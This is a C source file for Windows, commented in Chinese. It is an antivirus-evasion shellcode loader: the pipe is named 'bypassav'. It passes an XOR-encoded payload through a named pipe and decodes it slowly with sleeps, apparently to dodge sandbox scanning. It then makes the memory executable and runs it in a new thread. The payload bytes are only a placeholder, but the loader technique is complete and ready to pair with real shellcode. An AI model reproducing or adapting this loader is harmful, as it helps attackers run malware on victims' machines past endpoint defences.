#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#define BUFF_SIZE 1024
char buf[] = "payload(\xf6\xe2\x83\x0a...)";
PTCHAR ptsPipeName = TEXT("\\\\.\\pipe\\bypassav");

BOOL RecvShellcode(VOID){
    HANDLE hPipeClient;
    DWORD dwWritten;
    DWORD dwShellcodeSize = sizeof(buf);
    // 等待管道可用
    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);
    // 连接管道
    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,NULL);

    if(hPipeClient == INVALID_HANDLE_VALUE){
        printf("[+]Can't Open Pipe , Error : %d \n",GetLastError());
        return FALSE;
    }

    WriteFile(hPipeClient,buf,dwShellcodeSize,&dwWritten,NULL);
    if(dwWritten == dwShellcodeSize){
        CloseHandle(hPipeClient);
        printf("[+]Send Success ! Shellcode : %d Bytes\n",dwShellcodeSize);
        return TRUE;
    }
    CloseHandle(hPipeClient);
    return FALSE;
}


int wmain(int argc, TCHAR * argv[]){

    HANDLE hPipe;
    DWORD dwError;
    CHAR szBuffer[BUFF_SIZE];
    DWORD dwLen;
    PCHAR pszShellcode = NULL;
    DWORD dwOldProtect; // 内存页属性
    HANDLE hThread;
    DWORD dwThreadId;
    // 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea
    hPipe = CreateNamedPipe(
        ptsPipeName,
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE| PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        BUFF_SIZE,
        BUFF_SIZE,
        0,
        NULL);

    if(hPipe == INVALID_HANDLE_VALUE){
        dwError = GetLastError();
        printf("[-]Create Pipe Error : %d \n",dwError);
        return dwError;
    }

    CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)RecvShellcode,NULL,NULL,NULL);

    if(ConnectNamedPipe(hPipe,NULL) > 0){
        printf("[+]Client Connected...\n");
        ReadFile(hPipe,szBuffer,BUFF_SIZE,&dwLen,NULL);
        printf("[+]Get DATA Length : %d \n",dwLen);
        // 申请内存页
        pszShellcode = (PCHAR)VirtualAlloc(NULL,dwLen,MEM_COMMIT,PAGE_READWRITE);
        // 拷贝内存
        CopyMemory(pszShellcode,szBuffer,dwLen);

        for(DWORD i = 0;i< dwLen; i++){
            Sleep(50);
            _InterlockedXor8(pszShellcode+i,10);
        }

        // 这里开始更改它的属性为可执行
        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&dwOldProtect);
        // 执行Shellcode
        hThread = CreateThread(
            NULL, // 安全描述符
            NULL, // 栈的大小
            (LPTHREAD_START_ROUTINE)pszShellcode, // 函数
            NULL, // 参数
            NULL, // 线程标志
            &dwThreadId // 线程ID
        );

        WaitForSingleObject(hThread,INFINITE);
    }

    return 0;
}
